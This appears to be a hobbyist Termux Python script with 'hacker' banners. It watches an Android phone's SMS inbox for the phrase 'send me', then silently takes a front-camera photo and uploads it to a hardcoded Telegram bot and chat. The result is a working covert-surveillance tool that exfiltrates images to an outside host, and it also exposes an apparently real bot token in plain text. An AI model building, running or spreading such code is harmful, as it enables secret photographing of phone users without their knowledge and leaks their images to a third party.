import os
import random
import string
import requests
import json
import time
from colorama import Fore, Style
def print_hacker():
    print(Fore.BLUE + r"""
                ┓              ┓      
╋┏┓┏┓┏┳┓┓┏┓┏  ┏┓┣┓┏┓╋┏┓  ┏┏┓┏┓┏┫┏┓┏┓  
┗┗ ┛ ┛┗┗┗┻┛┗  ┣┛┛┗┗┛┗┗┛  ┛┗ ┛┗┗┻┗ ┛   

    """ + Style.RESET_ALL)

    #######################################  banner  #######################################

def print_banner():
    print(Fore.BLUE + r"""
      ┓
┏┏┓┏┓┏┫
┛┗ ┛┗┗┻
          Please wait for a moment 

    """ + Style.RESET_ALL)

########################################### banner ########################################


def create_directory():
    if not os.path.exists("photo"):
        print("Directory does not exist. Creating...")
        os.mkdir("photo")
        print("Directory created.")
    else:
        print("Directory already exists.")
def looper():
    while True: 
        filters = ("send me")  # add your massage and filter 
        filter_s = filters.split(",")
        jdata = os.popen("termux-sms-list -l 1").read() # Cheking massage in your massage android phone
        jd = json.loads(jdata)
        for j in jd:
            jd = json.loads(jdata)
            n  = (j['number']) # massage me se numder nikalale ka prosses
            m = (j['body']) # massage ka pura body 
            for f in filter_s: # yaha message ko f me stor kiya ja raha hai
                
        #
                if  f in j['body'].lower() and j['type'] == "inbox": # cheking massage filter se eq ha kee nahi
                    print(f)
                    os.system (f"termux-camera-photo -c1 image.jpeg")
                    
# Replace 'YOUR_BOT_TOKEN' with your actual bot token
                    bot_token = '6906665400:AAGl9hmiD_zKVGxznbyyvKzYYQ4oEOlJbr0'

# Replace 'chat_id' with the actual chat ID where you want to send the image
                    chat_id = '2108751290'

# your image file
                    image_path = 'image.jpeg'

# Telegram API endpoint for sending photos
                    url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'

                    print_banner()

# Prepare the parameters
                    params = {'chat_id': chat_id}

# Open and read the image file
                    with open(image_path, 'rb') as photo:

                        files = {'photo': photo}
     
# Send the image using the requests library
                        response = requests.post(url, params=params, files=files)
 
# Print the response (optional)
                    print(response.json())
                    letters = string.ascii_lowercase
                    directory_name = ''.join(random.choice(letters) for _ in range(10))
                    try:
                       
                       dirl = (directory_name)
                       print("Random directory created:", directory_name)
        
                       os.system(f"mv image.jpeg photo/{directory_name}.jpeg")
                    except OSError:
                       print("Failed to move File file  ")

                    time.sleep(5)
                    quit()
                         
                else:
                    print(m)
                    print("run agane 30 seconds")
                    time.sleep(23)
                    
print_hacker()
create_directory()
looper()

